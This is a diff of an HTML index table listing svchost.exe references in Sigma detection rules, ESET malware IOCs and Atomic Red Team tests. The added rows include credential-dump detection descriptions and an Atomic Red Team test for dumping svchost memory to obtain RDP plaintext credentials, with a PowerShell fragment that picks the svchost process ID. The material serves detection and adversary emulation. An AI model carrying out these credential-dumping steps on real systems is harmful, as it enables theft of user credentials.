@@ -316,13 +316,19 @@
     <tr>
       <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/builtin/win_mmc20_lateral_movement.yml">win_mmc20_lateral_movement.yml</a></td>
-      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="na">ParentImage</span><span class="pi">:</span> <span class="s1">'</span><span class="s">*\svchost.exe'</span></code></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="s">ParentImage\|endswith</span><span class="pi">:</span> <span class="s1">'</span><span class="s">\svchost.exe'</span></code></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
     </tr>
     <tr>
       <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/builtin/win_rdp_reverse_tunnel.yml">win_rdp_reverse_tunnel.yml</a></td>
       <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="na">description</span><span class="pi">:</span> <span class="s">Detects svchost hosting RDP termsvcs communicating with the loopback address</span></code></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/builtin/win_suspicious_werfault_connection_outbound.yml">win_suspicious_werfault_connection_outbound.yml</a></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="na">ParentImage</span><span class="pi">:</span> <span class="s1">'</span><span class="s">svchost.exe'</span></code></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
     </tr>
     <tr>
@@ -334,13 +340,19 @@
     <tr>
       <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/builtin/win_user_driver_loaded.yml">win_user_driver_loaded.yml</a></td>
-      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="pi">-</span> <span class="s1">'</span><span class="s">*\Windows\System32\svchost.exe'</span></code></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="pi">-</span> <span class="s1">'</span><span class="s">\Windows\System32\svchost.exe'</span></code></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/file_delete/sysmon_delete_prefetch.yml">sysmon_delete_prefetch.yml</a></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="na">Image</span><span class="pi">:</span> <span class="s1">'</span><span class="s">C:\windows\system32\svchost.exe'</span></code></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
     </tr>
     <tr>
       <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/file_event/sysmon_creation_system_file.yml">sysmon_creation_system_file.yml</a></td>
-      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="pi">-</span> <span class="s1">'</span><span class="s">*\svchost.exe'</span></code></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="pi">-</span> <span class="s1">'</span><span class="s">\svchost.exe'</span></code></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
     </tr>
     <tr>
@@ -376,13 +388,31 @@
     <tr>
       <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/image_load/sysmon_svchost_dll_search_order_hijack.yml">sysmon_svchost_dll_search_order_hijack.yml</a></td>
-      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="pi">-</span> <span class="s1">'</span><span class="s">*\svchost.exe'</span></code></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="pi">-</span> <span class="s1">'</span><span class="s">\svchost.exe'</span></code></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
     </tr>
     <tr>
       <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/image_load/sysmon_wmi_module_load.yml">sysmon_wmi_module_load.yml</a></td>
       <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="pi">-</span> <span class="s1">'</span><span class="s">\svchost.exe'</span></code></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/image_load/sysmon_wsman_provider_image_load.yml">sysmon_wsman_provider_image_load.yml</a></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="s">Image\|endswith</span><span class="pi">:</span> <span class="s1">'</span><span class="s">\svchost.exe'</span></code></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/image_load/win_suspicious_vss_ps_load.yml">win_suspicious_vss_ps_load.yml</a></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="pi">-</span> <span class="s1">'</span><span class="s">\svchost.exe'</span></code></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/image_load/win_susp_svchost_clfsw32.yml">win_susp_svchost_clfsw32.yml</a></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="s">Image\|endswith</span><span class="pi">:</span> <span class="s1">'</span><span class="s">\svchost.exe'</span></code></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
     </tr>
     <tr>
@@ -394,7 +424,7 @@
     <tr>
       <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/network_connection/sysmon_rdp_reverse_tunnel.yml">sysmon_rdp_reverse_tunnel.yml</a></td>
-      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="na">Image</span><span class="pi">:</span> <span class="s1">'</span><span class="s">*\svchost.exe'</span></code></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="s">Image\|endswith</span><span class="pi">:</span> <span class="s1">'</span><span class="s">\svchost.exe'</span></code></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
     </tr>
     <tr>
@@ -412,19 +442,49 @@
     <tr>
       <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_access/sysmon_invoke_phantom.yml">sysmon_invoke_phantom.yml</a></td>
-      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="na">TargetImage</span><span class="pi">:</span> <span class="s1">'</span><span class="s">*\windows\system32\svchost.exe'</span></code></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="s">TargetImage\|endswith</span><span class="pi">:</span> <span class="s1">'</span><span class="s">\WINDOWS\System32\svchost.exe'</span></code></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_access/sysmon_svchost_cred_dump.yml">sysmon_svchost_cred_dump.yml</a></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="na">title</span><span class="pi">:</span> <span class="s">SVCHOST Credential Dump</span></code></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_access/sysmon_svchost_cred_dump.yml">sysmon_svchost_cred_dump.yml</a></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="na">description</span><span class="pi">:</span> <span class="s">Detects when a process, such as mimikatz, accesses the memory of svchost to dump credentials</span></code></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_access/sysmon_svchost_cred_dump.yml">sysmon_svchost_cred_dump.yml</a></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="s">TargetImage\|endswith</span><span class="pi">:</span> <span class="s1">'</span><span class="s">\svchost.exe'</span></code></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/sysmon_susp_webdav_client_execution.yml">sysmon_susp_webdav_client_execution.yml</a></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="na">description</span><span class="pi">:</span> <span class="s">A General detection for svchost.exe spawning rundll32.exe with command arguments like C:\windows\system32\davclnt.dll,DavSetCookie. This could be an indicator of exfiltration or use of WebDav to launch code (hosted on WebDav Server).</span></code></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
     </tr>
     <tr>
       <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_apt_emissarypanda_sep19.yml">win_apt_emissarypanda_sep19.yml</a></td>
-      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="na">Image</span><span class="pi">:</span> <span class="s1">'</span><span class="s">*\svchost.exe'</span></code></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="s">Image\|endswith</span><span class="pi">:</span> <span class="s1">'</span><span class="s">\svchost.exe'</span></code></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_apt_hafnium.yml">win_apt_hafnium.yml</a></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="pi">-</span> <span class="s1">'</span><span class="s">\svchost.exe'</span></code></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
     </tr>
     <tr>
       <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_impacket_lateralization.yml">win_impacket_lateralization.yml</a></td>
-      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="pi">-</span> <span class="s1">'</span><span class="s">*svchost.exe</span><span class="nv"> </span><span class="s">-k</span><span class="nv"> </span><span class="s">netsvcs'</span> <span class="c1"># atexec on win10 (parent is "C:\Windows\system32\svchost.exe -k netsvcs")</span></code></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="pi">-</span> <span class="s1">'</span><span class="s">svchost.exe</span><span class="nv"> </span><span class="s">-k</span><span class="nv"> </span><span class="s">netsvcs'</span> <span class="c1"># atexec on win10 (parent is "C:\Windows\system32\svchost.exe -k netsvcs")</span></code></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
     </tr>
     <tr>
@@ -442,31 +502,49 @@
     <tr>
       <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_lethalhta.yml">win_lethalhta.yml</a></td>
-      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="na">ParentImage</span><span class="pi">:</span> <span class="s1">'</span><span class="s">*\svchost.exe'</span></code></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="s">ParentImage\|endswith</span><span class="pi">:</span> <span class="s1">'</span><span class="s">\svchost.exe'</span></code></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
     </tr>
     <tr>
       <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_malware_dridex.yml">win_malware_dridex.yml</a></td>
-      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="na">CommandLine</span><span class="pi">:</span> <span class="s1">'</span><span class="s">*\svchost.exe</span><span class="nv"> </span><span class="s">C:\Users\\*\Desktop\\*'</span></code></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="s">Image\|endswith</span><span class="pi">:</span> <span class="s1">'</span><span class="s">\svchost.exe'</span></code></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
     </tr>
     <tr>
       <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_malware_dridex.yml">win_malware_dridex.yml</a></td>
-      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="na">ParentImage</span><span class="pi">:</span> <span class="s1">'</span><span class="s">*\svchost.exe*'</span></code></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="s">ParentImage\|endswith</span><span class="pi">:</span> <span class="s1">'</span><span class="s">\svchost.exe'</span></code></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
     </tr>
     <tr>
       <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_office_shell.yml">win_office_shell.yml</a></td>
-      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="pi">-</span> <span class="s1">'</span><span class="s">*\svchost.exe'</span>  <span class="c1"># https://www.vmray.com/analyses/2d2fa29185ad/report/overview.html</span></code></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="pi">-</span> <span class="s1">'</span><span class="s">\svchost.exe'</span>  <span class="c1"># https://www.vmray.com/analyses/2d2fa29185ad/report/overview.html</span></code></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
     </tr>
     <tr>
       <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_proc_wrong_parent.yml">win_proc_wrong_parent.yml</a></td>
-      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="pi">-</span> <span class="s1">'</span><span class="s">*\svchost.exe'</span></code></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="pi">-</span> <span class="s1">'</span><span class="s">\svchost.exe'</span></code></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_script_event_consumer_spawn.yml">win_script_event_consumer_spawn.yml</a></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="pi">-</span> <span class="s1">'</span><span class="s">\svchost.exe'</span></code></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_rundll32_no_params.yml">win_susp_rundll32_no_params.yml</a></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="s">ParentImage\|endswith</span><span class="pi">:</span> <span class="s1">'</span><span class="s">\svchost.exe'</span></code></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_service_dir.yml">win_susp_service_dir.yml</a></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="pi">-</span> <span class="s1">'</span><span class="s">\svchost.exe'</span></code></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
     </tr>
     <tr>
@@ -484,13 +562,13 @@
     <tr>
       <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_svchost.yml">win_susp_svchost.yml</a></td>
-      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="na">Image</span><span class="pi">:</span> <span class="s1">'</span><span class="s">*\svchost.exe'</span></code></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="s">Image\|endswith</span><span class="pi">:</span> <span class="s1">'</span><span class="s">\svchost.exe'</span></code></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
     </tr>
     <tr>
       <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_svchost.yml">win_susp_svchost.yml</a></td>
-      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="pi">-</span> <span class="s1">'</span><span class="s">*\svchost.exe'</span></code></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="pi">-</span> <span class="s1">'</span><span class="s">\svchost.exe'</span></code></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
     </tr>
     <tr>
@@ -520,13 +598,19 @@
     <tr>
       <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_system_exe_anomaly.yml">win_system_exe_anomaly.yml</a></td>
-      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="pi">-</span> <span class="s1">'</span><span class="s">*\svchost.exe'</span></code></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="pi">-</span> <span class="s1">'</span><span class="s">\svchost.exe'</span></code></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
     </tr>
     <tr>
       <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_termserv_proc_spawn.yml">win_termserv_proc_spawn.yml</a></td>
-      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="na">ParentCommandLine</span><span class="pi">:</span> <span class="s1">'</span><span class="s">*\svchost.exe*termsvcs'</span></code></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="pi">-</span> <span class="s1">'</span><span class="s">\svchost.exe'</span></code></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_uac_bypass_cleanmgr.yml">win_uac_bypass_cleanmgr.yml</a></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="na">ParentCommandLine</span><span class="pi">:</span> <span class="s1">'</span><span class="s">C:\Windows\system32\svchost.exe</span><span class="nv"> </span><span class="s">-k</span><span class="nv"> </span><span class="s">netsvcs</span><span class="nv"> </span><span class="s">-p</span><span class="nv"> </span><span class="s">-s</span><span class="nv"> </span><span class="s">Schedule'</span></code></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
     </tr>
     <tr>
@@ -534,6 +618,12 @@
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_wmi_persistence_script_event_consumer.yml">win_wmi_persistence_script_event_consumer.yml</a></td>
       <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="na">ParentImage</span><span class="pi">:</span> <span class="s">C:\Windows\System32\svchost.exe</span></code></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/eset/malware-ioc">malware-ioc</a></td>
+      <td><a href="https://github.com/eset/malware-ioc/blob/master/badiis/misp-badiis.json">misp-badiis.json</a></td>
+      <td><code class="language-plaintext highlight language-cmhg highlighter-rouge"><span class="s">"description"</span><span class="err">:</span> <span class="s">"Adversaries may match or approximate the name or location of legitimate files or resources when naming/placing them. This is done for the sake of evading defenses and observation. This may be done by placing an executable in a commonly trusted directory (ex: under System32) or giving it the name of a legitimate, trusted program (ex: svchost.exe). In containerized environments, this may also be done by creating a resource in a namespace that matches the naming convention of a container pod or cluster. Alternatively, a file or container image name given may be a close approximation to legitimate programs/images or something innocuous.\n\nAdversaries may also use the same icon of the file they are trying to mimic."</span><span class="p">,</span></code></td>
+      <td><a href="https://github.com/eset/malware-ioc/blob/master/LICENSE">© ESET 2014-2018</a></td>
     </tr>
     <tr>
       <td><a href="https://github.com/eset/malware-ioc">malware-ioc</a></td>
@@ -545,6 +635,18 @@
       <td><a href="https://github.com/eset/malware-ioc">malware-ioc</a></td>
       <td><a href="https://github.com/eset/malware-ioc/blob/master/invisimole/README.adoc">invisimole</a></td>
       <td><code class="language-plaintext highlight language-cmhg highlighter-rouge"><span class="s">"ImagePath"</span><span class="err">=</span> <span class="s">"%SystemRoot%\System32\svchost.exe -k DComLaunch"</span> <span class="p">(</span><span class="ni">translated</span> <span class="ni">from</span> <span class="ni">hex</span><span class="p">)</span></code></td>
+      <td><a href="https://github.com/eset/malware-ioc/blob/master/LICENSE">© ESET 2014-2018</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/eset/malware-ioc">malware-ioc</a></td>
+      <td><a href="https://github.com/eset/malware-ioc/blob/master/invisimole/sigma/win_apt_invisimole_wdigest_chain.yml">win_apt_invisimole_wdigest_chain.yml</a></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="s">ParentImage\|endswith</span><span class="pi">:</span> <span class="s1">'</span><span class="s">svchost.exe'</span></code></td>
+      <td><a href="https://github.com/eset/malware-ioc/blob/master/LICENSE">© ESET 2014-2018</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/eset/malware-ioc">malware-ioc</a></td>
+      <td><a href="https://github.com/eset/malware-ioc/blob/master/invisimole/sigma/win_apt_invisimole_wrapper_dll.yml">win_apt_invisimole_wrapper_dll.yml</a></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="pi">-</span> <span class="s1">'</span><span class="s">\Windows\svchost.exe'</span></code></td>
       <td><a href="https://github.com/eset/malware-ioc/blob/master/LICENSE">© ESET 2014-2018</a></td>
     </tr>
     <tr>
@@ -580,6 +682,12 @@
     <tr>
       <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
       <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/index.md">index.md</a></td>
+      <td>- Atomic Test #3: Dump svchost.exe to gather RDP credentials [windows]</td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/index.md">index.md</a></td>
       <td>- Atomic Test #4: Parent PID Spoofing - Spawn from svchost.exe [windows]</td>
       <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
     </tr>
@@ -598,6 +706,12 @@
     <tr>
       <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
       <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/windows-index.md">windows-index.md</a></td>
+      <td>- Atomic Test #3: Dump svchost.exe to gather RDP credentials [windows]</td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/windows-index.md">windows-index.md</a></td>
       <td>- Atomic Test #4: Parent PID Spoofing - Spawn from svchost.exe [windows]</td>
       <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
     </tr>
@@ -611,6 +725,54 @@
       <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
       <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/windows-index.md">windows-index.md</a></td>
       <td>- Atomic Test #12: svchost writing a file to a UNC path [windows]</td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003/T1003.md">T1003.md</a></td>
+      <td>- <a href="#atomic-test-3---dump-svchostexe-to-gather-rdp-credentials">Atomic Test #3 - Dump svchost.exe to gather RDP credentials</a></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003/T1003.md">T1003.md</a></td>
+      <td>## Atomic Test #3 - Dump svchost.exe to gather RDP credentials</td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003/T1003.md">T1003.md</a></td>
+      <td>The svchost.exe contains the RDP plain-text credentials.</td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003/T1003.md">T1003.md</a></td>
+      <td>Source: https://www.n00py.io/2021/05/dumping-plaintext-rdp-credentials-from-svchost-exe/</td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003/T1003.md">T1003.md</a></td>
+      <td>Upon successful execution, you should see the following file created $env:TEMP\svchost-exe.dmp.</td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003/T1003.md">T1003.md</a></td>
+      <td>if($ps){$id = $ps[0].OwningProcess} else {$id = (Get-Process svchost)[0].Id }</td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
+    </tr>
+    <tr>
